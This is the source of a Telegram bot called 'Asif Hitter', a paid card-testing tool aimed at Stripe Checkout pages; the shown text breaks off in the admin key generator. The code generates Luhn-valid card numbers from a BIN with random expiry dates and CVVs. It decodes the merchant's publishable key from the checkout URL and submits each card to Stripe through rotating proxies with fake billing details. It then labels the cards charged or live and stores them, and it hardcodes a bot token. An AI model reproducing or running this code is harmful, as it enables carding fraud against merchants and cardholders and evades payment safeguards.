"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT v4.1 FINAL ⚡
Production Ready | Professional Card-by-Card Output | All Features
Dev: Asif Sakhani (@Asifsakhani786)

OUTPUT FORMAT PER CARD:
  CC: 377481016782531|09|2030|5012
  Status: 🔴 Declined ❌
  Response: generic_decline - Your card was declined.
  ────────────────────

REQUIRED: pip install "python-telegram-bot[job-queue]" aiohttp aiohttp-socks aiofiles
"""

import asyncio, json, os, random, re, sys, time, base64, traceback, logging
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, Dict, Any, List

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ═══════════════════════════ LOGGING ═══════════════════════════
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout), logging.FileHandler("bot.log", encoding="utf-8", mode="a")]
)
logger = logging.getLogger("AsifHitter")

# ═══════════════════════════ CONFIG ═══════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8737062520:AAF5gvAZOonEoTo__hUpKSRvfcKo96e10Ss")
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# ═══════════════════════════ EMOJI IDs ═══════════════════════════
EMOJI = {
    "✅":"5444987348334965906","❌":"5447647474984449520","🔥":"5116414868357907335",
    "⚡":"5219943216781995020","💳":"5447453226498552490","🌐":"5447602197439218445",
    "📊":"5445146408153806223","📦":"5303102515301083665","⏳":"5258113901106580375",
    "🚀":"4904936030232117798","⚠️":"4915853119839011973","💎":"5343636681473935403",
    "👑":"6266995104687330978","🔍":"5258396243666681152","⏱️":"5343927661213279013",
    "💥":"5122933683820430249","👤":"5445174334031166029","🔑":"5454386656628991407",
    "👥":"5454371323595744068","ℹ️":"5289930378885214069","📢":"5116445341150872576",
    "💰":"5116648080787112958","🔗":"5447479640547428304","📌":"5447187153274567373",
    "🎉":"5172632227871196306","🎁":"5283031441637148958","🚫":"5116151848855667552",
    "⛔":"4918014360267260850","🛡":"5219672809936006424","📡":"5447448489149625830",
    "🔐":"5258476306152038031","🗑":"5305652587708572354","🟢":"5444987348334965906",
    "🔵":"5258024802010026053","🟡":"5343927661213279013","🔴":"5447647474984449520",
    "❤️":"5287446418909328171","🤖":"5219943216781995020","🎯":"5444987348334965906",
    "⭐":"6267298050205553492","💠":"5870498447068502918","🏦":"5445408306669582934",
    "🌟":"5310224206732996002","💬":"5447510826304959724",
}
def e(emoji): 
    eid = EMOJI.get(emoji)
    return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>' if eid else emoji
def ec(emoji, count=1): return "".join([e(emoji) for _ in range(count)])
def h(text): return (text or "").replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
def separator(char="─", length=35): return char * length

# ═══════════════════════════ DATA ═══════════════════════════
DATA_DIR = "data"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"
STATS_FILE = f"{DATA_DIR}/stats.json"
os.makedirs(DATA_DIR, exist_ok=True)

CACHE = {"settings":None,"premium":{},"proxies":{},"keys":{},"stats":{},"ts":0}

def _lj(path, default=None):
    if default is None: default = {}
    try:
        if os.path.exists(path):
            with open(path,"r",encoding="utf-8") as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except: pass
    return default

def _sj(path, data):
    try:
        with open(path,"w",encoding="utf-8") as f:
            json.dump(data,f,indent=2,default=str)
        return True
    except: return False

def _rc():
    CACHE["settings"] = _lj(SETTINGS_FILE,{"log_channel":"","max_proxies":6,"version":"4.1"})
    CACHE["premium"] = _lj(PREMIUM_FILE,{"users":{}})
    CACHE["proxies"] = _lj(PROXY_FILE,{"users":{}})
    CACHE["keys"] = _lj(KEYS_FILE,{"keys":{}})
    CACHE["stats"] = _lj(STATS_FILE,{"total_hits":0,"charged":0,"live":0,"declined":0})
    CACHE["ts"] = time.time()
_rc()

def cg(cat, key=None, default=None):
    if time.time() - CACHE["ts"] > 30: _rc()
    d = CACHE.get(cat,{})
    return d.get(key,default) if key else d

def cs(cat, key, value, path):
    if time.time() - CACHE["ts"] > 30: _rc()
    if cat in CACHE: CACHE[cat][key] = value
    _sj(path, CACHE[cat])
    CACHE["ts"] = time.time()

def gs(k,d=None): return cg("settings",k,d)
def ip(uid):
    u = cg("premium","users",{}).get(str(uid),{})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry","2000-01-01")): return True
        except: pass
    return False
def gp(uid): return cg("proxies","users",{}).get(str(uid),[])
def ia(uid): return uid in ADMIN_IDS

# ═══════════════════════════ PROXY ═══════════════════════════
def parse_proxy(line):
    line = line.strip()
    if not line: return None
    if "://" in line:
        if any(line.lower().startswith(p) for p in ["http://","https://","socks4://","socks5://"]): return line
        return None
    parts = line.split(":")
    if len(parts)==2 and parts[1].isdigit() and 1<=int(parts[1])<=65535: return f"http://{line}"
    if len(parts)==4 and parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def proxy_conn(proxy):
    if not proxy: return None,None
    p = proxy.lower()
    if p.startswith("socks4://"):
        hp = proxy.split("://")[1]
        if "@" in hp: hp = hp.split("@")[1]
        hst,prt = hp.rsplit(":",1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS4,host=hst,port=int(prt),rdns=True),None
    if p.startswith("socks5://"):
        hp = proxy.split("://")[1]
        if "@" in hp: hp = hp.split("@")[1]
        hst,prt = hp.rsplit(":",1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS5,host=hst,port=int(prt),rdns=True),None
    return None,proxy

async def test_proxy(proxy):
    conn,pxy = proxy_conn(proxy)
    try:
        async with aiohttp.ClientSession(connector=conn,timeout=aiohttp.ClientTimeout(total=10)) as s:
            t1=time.time()
            async with s.get("https://api.stripe.com/v1",proxy=pxy,ssl=False) as r:
                return True,f"OK {r.status} ({int((time.time()-t1)*1000)}ms)"
    except asyncio.TimeoutError: return False,"Timeout"
    except Exception as e: return False,str(e)[:50]

# ═══════════════════════════ CARD GENERATOR ═══════════════════════════
def luhn(partial):
    for d in range(10):
        t=partial+str(d)
        if sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) for i,c in enumerate(t[::-1]))%10==0: return str(d)
    return "0"

def cl(b): return 15 if b[:2] in ("34","37") else (14 if b[:2] in ("30","36","38") or b[:3] in ("300","305") else 16)

def gen_card(bs):
    parts=bs.strip().split("|"); raw=re.sub(r"[^0-9xX]","",parts[0])
    c="".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw); ln=cl(c)
    if len(c)>=ln: c=c[:ln-1]
    while len(c)<ln-1: c+=str(random.randint(0,9))
    c+=luhn(c); yr=datetime.now().year; mm=str(random.randint(1,12)).zfill(2)
    yy=str(yr+random.randint(1,6))[-2:]; cvl=4 if cl(raw)==15 and raw[:2] in ("34","37") else 3
    cvv=str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc":c,"mo":mm,"yr":yy,"cv":cvv,"f":f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════ STRIPE CHECKER ═══════════════════════════
class SC:
    def __init__(self,url,proxy=None):
        self.url=url; self.proxy=proxy; self.pk=None; self.cs=None
        self.mer="Unknown"; self.amt="N/A"; self.amt_raw=0; self.site_url=""; self.chk=""; self.sub=0

    def _hdr(self):
        hdrs={"accept":"application/json","content-type":"application/x-www-form-urlencoded",
              "origin":"https://checkout.stripe.com","referer":"https://checkout.stripe.com/",
              "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "sec-ch-ua":'"Chromium";v="127", "Not)A;Brand";v="99"',
              "sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"'}
        if self.pk: hdrs["Authorization"]=f"Bearer {self.pk}"
        return hdrs

    async def init(self):
        try:
            m=re.search(r'cs_(?:live|test)_[A-Za-z0-9]+',self.url)
            if m: self.cs=m.group(0)
            if '#' in self.url and not self.pk:
                try:
                    hp=self.url.split('#')[1]; dc=base64.b64decode(unquote(hp))
                    xr=''.join(chr(b^5) for b in dc)
                    pm=re.search(r'pk_(?:live|test)_[A-Za-z0-9]+',xr)
                    if pm: self.pk=pm.group(0)
                    sm=re.search(r'https?://[^\s\"\<\>\\]+',xr)
                    if sm: self.site_url=sm.group(0).rstrip('\\')
                except: pass
            if not self.cs: return False
            conn,pxy=proxy_conn(self.proxy)
            if not self.pk:
                try:
                    async with aiohttp.ClientSession(connector=conn,timeout=aiohttp.ClientTimeout(total=10)) as s:
                        async with s.get(self.url,headers={"user-agent":"Mozilla/5.0"},proxy=pxy,ssl=False) as r:
                            pm=re.search(r'pk_(?:live|test)_[A-Za-z0-9]+',await r.text())
                            if pm: self.pk=pm.group(0)
                except: pass
            if not self.pk: return False
            async with aiohttp.ClientSession(connector=conn,timeout=aiohttp.ClientTimeout(total=10)) as s:
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=self._hdr(),data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",proxy=pxy,ssl=False) as r:
                    d=await r.json()
                if "error" in d: return False
                ac=d.get("account_settings") or {}
                self.mer=ac.get("display_name") or ac.get("business_name") or "Unknown"
                if not self.site_url: self.site_url=ac.get("statement_descriptor","") or ""
                lg=d.get("line_item_group") or {}; iv=d.get("invoice") or {}; pi=d.get("payment_intent") or {}
                am=lg.get("total",0) or iv.get("total",0) or pi.get("amount",0)
                cu=(lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
                self.amt_raw=am
                self.amt=f"{am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "0.00 USD")
                self.chk=d.get("init_checksum",""); self.sub=lg.get("subtotal",0) if lg else am
                return True
        except: return False

    async def charge(self,card):
        res={"card":card["f"],"st":"ERROR","msg":"Unknown error"}
        conn,pxy=proxy_conn(self.proxy)
        try:
            async with aiohttp.ClientSession(connector=conn,timeout=aiohttp.ClientTimeout(total=30)) as s:
                hdrs=self._hdr()
                pmb=(f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                     f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                     f"&billing_details[name]=John+Smith&billing_details[email]=john@example.com"
                     f"&billing_details[address][country]=US&billing_details[address][line1]=476+West+White+Mountain+Blvd"
                     f"&billing_details[address][city]=Pinetop&billing_details[address][postal_code]=85929"
                     f"&billing_details[address][state]=AZ&key={self.pk}"
                     f"&muid={random.getrandbits(32):08x}&sid={random.getrandbits(32):08x}"
                     f"&payment_user_agent=stripe.js%2Ff5e714652c"
                     f"&time_on_page={random.randint(30000,60000)}&pasted_fields=number")
                async with s.post("https://api.stripe.com/v1/payment_methods",headers=hdrs,data=pmb,proxy=pxy,ssl=False) as r:
                    pm=await r.json()
                if "error" in pm:
                    cd=pm["error"].get("decline_code",""); mg=pm["error"].get("message","")
                    if "unsupported" in mg.lower(): res["st"],res["msg"]="ERROR",f"PK: {mg[:80]}"; return res
                    if cd=="incorrect_cvc" or "security code" in mg.lower(): res["st"],res["msg"]="LIVE",f"incorrect_cvc - {mg[:80]}"
                    elif cd=="insufficient_funds": res["st"],res["msg"]="LIVE",f"insufficient_funds - {mg[:80]}"
                    else: res["st"],res["msg"]="DECLINED",mg[:100]
                    return res
                pmid=pm.get("id")
                if not pmid: return res
                cfb=(f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                     f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                     f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                     f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                     f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                     f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                     f"&expected_payment_method_type=card&key={self.pk}&init_checksum={quote(self.chk)}")
                await asyncio.sleep(4.0)
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",headers=hdrs,data=cfb,proxy=pxy,ssl=False) as r:
                    cf=await r.json()
                if "error" in cf:
                    er=cf["error"]; cd=er.get("decline_code",""); mg=er.get("message","")
                    if "captcha" in mg.lower(): res["st"],res["msg"]="HCAPTCHA","CAPTCHA_REQUIRED. Try again later"
                    elif cd in ("challenge_required","require_action"): res["st"],res["msg"]="3DS","3DS Authentication Required"
                    elif cd=="incorrect_cvc": res["st"],res["msg"]="LIVE",f"incorrect_cvc - {mg[:80]}"
                    elif cd=="insufficient_funds": res["st"],res["msg"]="LIVE",f"insufficient_funds - {mg[:80]}"
                    else: res["st"],res["msg"]="DECLINED",f"{cd} - {mg}" if cd else mg[:100]
                else:
                    pi2=cf.get("payment_intent") or {}; st2=pi2.get("status","") or cf.get("status","")
                    if st2=="succeeded": res["st"],res["msg"]="CHARGED","Payment Successful ✅"
                    elif st2=="requires_action": res["st"],res["msg"]="3DS","3DS Authentication Required"
                    else: res["st"],res["msg"]="ERROR",f"Status: {st2}"
        except asyncio.TimeoutError: res["st"],res["msg"]="ERROR","Request Timeout"
        except Exception as ex: res["st"],res["msg"]="ERROR",str(ex)[:80]
        return res

# ═══════════════════════════ ERROR HANDLER ═══════════════════════════
async def err_handler(update,ctx):
    logger.error(f"Error: {ctx.error}")
    try:
        if update and hasattr(update,"effective_message") and update.effective_message:
            await update.effective_message.reply_text(f"❌ Error. Contact @{DEV_USERNAME}")
    except: pass

# ═══════════════════════════ START ═══════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id; adm=ia(uid); prem=ip(uid)
        proxies=gp(uid); mp=gs("max_proxies",6)
        badge=f"{e('⚡')} {e('👑')} ADMIN" if adm else (f"{e('👑')} PREMIUM" if prem else f"{e('⛔')} FREE")
        kb=[
            [InlineKeyboardButton(f"{e('🌐')} Gateway",callback_data="gate_help"),InlineKeyboardButton(f"{e('💳')} Hit",callback_data="hit_help")],
            [InlineKeyboardButton(f"{e('🔐')} Proxy ({len(proxies)})",callback_data="proxy_menu"),InlineKeyboardButton(f"{e('🔑')} Redeem",callback_data="redeem_help")],
            [InlineKeyboardButton(f"{e('👤')} Status",callback_data="status"),InlineKeyboardButton(f"{e('📊')} Stats",callback_data="stats_view")],
        ]
        if adm: kb.append([InlineKeyboardButton(f"{e('⚡')} Admin Panel",callback_data="admin_panel")])
        txt=f"""{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

┌─────────────────────────────┐
│ {e('🤖')} Status: {badge}
│ {e('💎')} Version: <code>v{gs('version','4.1')}</code>
│ {e('🔐')} Proxies: <b>{len(proxies)}/{mp}</b>
└─────────────────────────────┘

{e('⭐')} <b>Commands:</b>
{e('🌐')} /gate — Check gateway
{e('💳')} /hit — Hit checkout (Premium)
{e('🔐')} /addproxy — Add proxies
{e('🔍')} /proxy — Proxy status
{e('🗑')} /rmproxy — Remove proxies
{e('🔑')} /redeem — Redeem key
{e('👤')} /status — Your status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>"""
        await update.message.reply_text(txt,parse_mode=ParseMode.HTML,reply_markup=InlineKeyboardMarkup(kb))
    except Exception as ex:
        logger.error(f"start: {ex}")
        await update.message.reply_text(f"🚀 ASIF HITTER v4.1\n\nCommands: /gate /hit /addproxy /proxy /rmproxy /redeem /status\nDev: @{DEV_USERNAME}")

# ═══════════════════════════ PROXY ═══════════════════════════
async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id; msg=update.message
        content=""
        if msg.document:
            f=await msg.document.get_file(); fb=await f.download_as_bytearray()
            content=fb.decode("utf-8",errors="ignore")
        elif msg.text: content=msg.text.replace("/addproxy","",1).strip()
        else:
            await msg.reply_text(f"{e('❌')} Send proxy list or .txt file\n{e('ℹ️')} <code>ip:port</code> | <code>http://ip:port</code> | <code>socks5://ip:port</code>",parse_mode=ParseMode.HTML)
            return
        all_lines=[l.strip() for l in content.split("\n") if l.strip()]
        if not all_lines:
            await msg.reply_text(f"{e('❌')} No proxies found",parse_mode=ParseMode.HTML)
            return
        valid=[]; invalid=0
        for line in all_lines:
            p=parse_proxy(line)
            if p: valid.append(p)
            else: invalid+=1
        if not valid:
            await msg.reply_text(f"{e('❌')} 0 valid out of {len(all_lines)}",parse_mode=ParseMode.HTML)
            return
        current=gp(uid); mp=gs("max_proxies",6); slots=mp-len(current)
        if slots<=0:
            await msg.reply_text(f"{e('⛔')} Limit ({mp}) reached. /rmproxy first",parse_mode=ParseMode.HTML)
            return
        st=await msg.reply_text(f"{e('⏳')} Checking {len(valid)} proxies...",parse_mode=ParseMode.HTML)
        added=0; dead=0; last_err=""
        for proxy in valid:
            if added>=slots: break
            is_live,info=await test_proxy(proxy)
            if is_live and proxy not in current: current.append(proxy); added+=1
            elif not is_live: dead+=1; last_err=info
            try:
                await st.edit_text(f"{e('⏳')} <b>Checking...</b>\n{e('🟢')} Saved: <b>{added}/{slots}</b>\n{e('🔴')} Dead: <b>{dead}</b>\n💬 <code>{h(last_err[:30])}</code>",parse_mode=ParseMode.HTML)
            except: pass
            await asyncio.sleep(0.5)
        d=_lj(PROXY_FILE,{"users":{}}); d["users"][str(uid)]=current[:mp]; _sj(PROXY_FILE,d); _rc()
        await st.edit_text(f"{e('✅')} <b>Done!</b>\n{e('🟢')} Saved: <b>{added}</b>\n{e('🔴')} Dead: <b>{dead}</b>\n{e('📦')} Total: <b>{len(current)}/{mp}</b>",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"addproxy: {ex}")

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id; proxies=gp(uid)
        if not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies. /addproxy",parse_mode=ParseMode.HTML)
            return
        st=await update.message.reply_text(f"{e('⏳')} Checking...",parse_mode=ParseMode.HTML)
        alive=[]; dead=[]
        for p in proxies:
            is_live,info=await test_proxy(p)
            if is_live: alive.append(f"{e('✅')} <code>{h(p[:50])}</code> — {info}")
            else: dead.append(f"{e('❌')} <code>{h(p[:45])}</code> — {info}")
            await asyncio.sleep(0.3)
        txt=f"{e('📡')} <b>PROXY STATUS</b>\n\n{e('🟢')} Alive: {len(alive)}\n{e('🔴')} Dead: {len(dead)}\n\n"
        if alive: txt+="\n".join(alive[:15])+"\n\n"
        if dead: txt+="\n".join(dead[:10])
        await st.edit_text(txt[:4000],parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"proxy: {ex}")

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id; cur=gp(uid)
        if not cur:
            await update.message.reply_text(f"{e('❌')} No proxies",parse_mode=ParseMode.HTML)
            return
        if ctx.args:
            a=ctx.args[0]
            if a.lower()=="all":
                d=_lj(PROXY_FILE,{"users":{}}); d["users"][str(uid)]=[]; _sj(PROXY_FILE,d); _rc()
                await update.message.reply_text(f"{e('✅')} All removed!",parse_mode=ParseMode.HTML)
                return
            try:
                idx=int(a)-1
                if 0<=idx<len(cur):
                    cur.pop(idx); d=_lj(PROXY_FILE,{"users":{}}); d["users"][str(uid)]=cur; _sj(PROXY_FILE,d); _rc()
                    await update.message.reply_text(f"{e('✅')} Removed",parse_mode=ParseMode.HTML)
                else: await update.message.reply_text(f"{e('❌')} 1-{len(cur)}",parse_mode=ParseMode.HTML)
            except: await update.message.reply_text(f"{e('❌')} /rmproxy 1",parse_mode=ParseMode.HTML)
        else:
            txt=f"{e('🗑')} <b>REMOVE</b>\n\n"
            for i,p in enumerate(cur,1): txt+=f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
            txt+=f"\n<code>/rmproxy 1</code> or <code>/rmproxy all</code>"
            await update.message.reply_text(txt,parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"rmproxy: {ex}")

# ═══════════════════════════ GATEWAY ═══════════════════════════
async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/gate &lt;url&gt;</code>",parse_mode=ParseMode.HTML)
            return
        uid=update.effective_user.id; proxies=gp(uid); proxy=random.choice(proxies) if proxies else None
        st=await update.message.reply_text(f"{e('⏳')} Fetching...",parse_mode=ParseMode.HTML)
        ck=SC(ctx.args[0],proxy)
        if await ck.init():
            await st.edit_text(f"{e('🌐')} <b>GATEWAY</b>\n\n{e('📦')} <b>Merchant:</b> {h(ck.mer)}\n{e('💰')} <b>Amount:</b> {h(ck.amt)}\n{e('🏦')} <b>Site:</b> {h(ck.site_url or 'N/A')}\n{e('🔑')} <b>PK:</b> <code>{h(ck.pk[:30])}...</code>\n{e('✅')} Gateway LIVE",parse_mode=ParseMode.HTML)
        else: await st.edit_text(f"{e('❌')} Failed. Check URL.",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"gate: {ex}")

# ═══════════════════════════ HIT (PROFESSIONAL OUTPUT) ═══════════════════════════
async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id; adm=ia(uid)
        if not ip(uid) and not adm:
            await update.message.reply_text(f"{e('🚫')} <b>ACCESS DENIED</b>\n\n{e('⛔')} Premium!\n{e('🔑')} /redeem &lt;key&gt;",parse_mode=ParseMode.HTML)
            return
        if len(ctx.args)<2:
            await update.message.reply_text(f"{e('⚠️')} <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n{e('💳')} <code>/hit https://... 37936303</code>",parse_mode=ParseMode.HTML)
            return
        url,bin_in=ctx.args[0],ctx.args[1]
        proxies=gp(uid)
        if not adm and not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies! /addproxy",parse_mode=ParseMode.HTML)
            return
        proxy=random.choice(proxies) if proxies else None
        
        st=await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>",parse_mode=ParseMode.HTML)
        ck=SC(url,proxy)
        if not await ck.init():
            await st.edit_text(f"{e('❌')} <b>Failed!</b> Check URL or proxy.",parse_mode=ParseMode.HTML)
            return
        
        cards=[gen_card(bin_in) for _ in range(10)]
        charged_c,live_c=[],[]
        td=dc=hc=er=0
        # Store results as: (card_full, status_emoji, status_text, response_msg)
        results_list = []
        
        for i,card in enumerate(cards):
            # Show current card being processed
            progress = f"""
{e('🚀')} <b>Stripe Checkout Hitter</b>
{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> <code>{bin_in[:8]}xxxx</code>

{e('⏳')} <b>Processing:</b> {i+1}/10
{e('🎯')} <code>{card['f']}</code>

{e('🟢')} {len(charged_c)} | {e('🔵')} {len(live_c)} | 🟡 {td} | 🔴 {dc}
"""
            try: await st.edit_text(progress,parse_mode=ParseMode.HTML)
            except: pass
            
            r=await ck.charge(card)
            sts=r["st"]
            msg=r["msg"]
            full_card=r["card"]
            
            # Format status
            if sts=="CHARGED":
                charged_c.append(full_card)
                results_list.append((full_card, e('🟢'), "Charged ✅", msg))
            elif sts=="LIVE":
                live_c.append(full_card); dc+=1
                results_list.append((full_card, e('🔵'), "Live CVC Match", msg))
            elif sts=="3DS":
                td+=1
                results_list.append((full_card, "🟡", "3DS Required", msg))
            elif sts=="HCAPTCHA":
                hc+=1
                results_list.append((full_card, e('⛔'), "Captcha Required", msg))
            elif sts=="DECLINED":
                dc+=1
                results_list.append((full_card, "🔴", "Declined ❌", msg))
            else:
                er+=1
                results_list.append((full_card, "⚪", "Error", msg))
            
            await asyncio.sleep(4.0)
        
        # BUILD PROFESSIONAL OUTPUT — SHOW EVERY CARD WITH RESPONSE
        final = f"""{e('👑')} <b>STRIPE CHECKOUT HITTER</b> {e('👑')}

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> <code>{bin_in[:8]}xxxx</code>

{separator('═',35)}

"""
        # Add each card result
        for card_full, status_emoji, status_text, response_msg in results_list:
            final += f"""
<b>CC:</b> <code>{card_full}</code>
<b>Status:</b> {status_emoji} {status_text}
<b>Response:</b> {h(response_msg[:100])}
{separator()}
"""
        
        # Summary
        final += f"""
{separator('═',35)}
{e('📊')} <b>SUMMARY:</b>
{e('🟢')} Charged: <b>{len(charged_c)}</b>
{e('🔵')} Live: <b>{len(live_c)}</b>
🟡 3DS: <b>{td}</b>
🔴 Declined: <b>{dc}</b>
{e('⛔')} Captcha: <b>{hc}</b>
⚪ Error: <b>{er}</b>

{e('🏦')} <b>Site:</b> {h(ck.mer)} ({h(ck.site_url or 'N/A')})
{e('💰')} <b>Amount:</b> {h(ck.amt)}

{e('❤️')} <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
        
        # Save
        if charged_c:
            with open(f"{DATA_DIR}/charged.txt","a") as f: f.write("\n".join(charged_c)+"\n")
        if live_c:
            with open(f"{DATA_DIR}/live.txt","a") as f: f.write("\n".join(live_c)+"\n")
        
        # Update stats
        stats=_lj(STATS_FILE,{"total_hits":0,"charged":0,"live":0,"declined":0})
        stats["total_hits"]=stats.get("total_hits",0)+1
        stats["charged"]=stats.get("charged",0)+len(charged_c)
        stats["live"]=stats.get("live",0)+len(live_c)
        stats["declined"]=stats.get("declined",0)+dc
        _sj(STATS_FILE,stats); _rc()
        
        # Send — chunk if too long
        if len(final)>3900:
            parts=[final[i:i+3800] for i in range(0,len(final),3800)]
            for idx,part in enumerate(parts):
                if idx==0: await st.edit_text(part,parse_mode=ParseMode.HTML)
                else:
                    await update.message.reply_text(part,parse_mode=ParseMode.HTML)
                    await asyncio.sleep(0.3)
        else:
            await st.edit_text(final,parse_mode=ParseMode.HTML)
            
    except Exception as ex:
        logger.error(f"hit: {ex}")
        await update.message.reply_text(f"❌ Error: {str(ex)[:100]}")

# ═══════════════════════════ REDEEM ═══════════════════════════
async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id
        if ip(uid):
            pd=_lj(PREMIUM_FILE); u=pd["users"].get(str(uid),{})
            await update.message.reply_text(f"{e('⛔')} <b>ALREADY PREMIUM</b>\n{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>",parse_mode=ParseMode.HTML)
            return
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/redeem &lt;key&gt;</code>",parse_mode=ParseMode.HTML)
            return
        key=ctx.args[0]; kd=_lj(KEYS_FILE,{"keys":{}})
        if key not in kd["keys"]:
            await update.message.reply_text(f"{e('❌')} Invalid key!",parse_mode=ParseMode.HTML)
            return
        kdata=kd["keys"][key]
        if kdata.get("used"):
            await update.message.reply_text(f"{e('❌')} Key already used",parse_mode=ParseMode.HTML)
            return
        hours=kdata.get("hours",kdata.get("days",1)*24)
        expiry=(datetime.now()+timedelta(hours=hours)).isoformat()
        kdata["used"]=True; kdata["used_by"]=uid; kdata["expiry"]=expiry; kdata["redeemed_at"]=datetime.now().isoformat()
        _sj(KEYS_FILE,kd)
        dur=f"{hours//24} day(s)" if hours>=24 else f"{hours} hour(s)"
        pd=_lj(PREMIUM_FILE,{"users":{}})
        pd["users"][str(uid)]={"name":update.effective_user.full_name,"username":update.effective_user.username or "","activated":datetime.now().isoformat(),"expiry":expiry,"key":key,"plan":dur}
        _sj(PREMIUM_FILE,pd); _rc()
        await update.message.reply_text(f"{ec('🎉',5)}\n\n{e('👑')} <b>PREMIUM ACTIVATED!</b>\n\n{e('🔑')} Key: <code>{key}</code>\n{e('⏱️')} Expires: <code>{expiry[:10]}</code>\n{e('💎')} Plan: <code>{dur}</code>\n\n{e('🚀')} Use /hit!",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"redeem: {ex}")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        uid=update.effective_user.id
        if ia(uid): await update.message.reply_text(f"{e('⚡')} {e('👑')} <b>ADMIN</b>\nPermanent access",parse_mode=ParseMode.HTML)
        elif ip(uid):
            pd=_lj(PREMIUM_FILE); u=pd["users"].get(str(uid),{})
            await update.message.reply_text(f"{e('👑')} <b>PREMIUM</b>\n{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n{e('💎')} Plan: <code>{u.get('plan','?')}</code>",parse_mode=ParseMode.HTML)
        else: await update.message.reply_text(f"{e('⛔')} <b>FREE</b>\n{e('🔑')} /redeem &lt;key&gt;",parse_mode=ParseMode.HTML)
    except Exception as ex: logger.error(f"status: {ex}")

# ═══════════════════════════ ADMIN ═══════════════════════════
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        if not ia(update.effective_user.id): return
        if len(ctx.args)<2:
            await update.message.reply_text(f"{e('⚠️')} <code>/genkey 10 24</code>",parse_mode=ParseMode.HTML)
            return
        count,hours=int(ctx.args[0]),int(ctx.args[1])
        kd=_lj(KEYS_FILE,{"keys":{}}); new=[]
        chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        for _ in range(count):
            k=f"ASIF-{''.join(random.choices(chars,k=20))}"
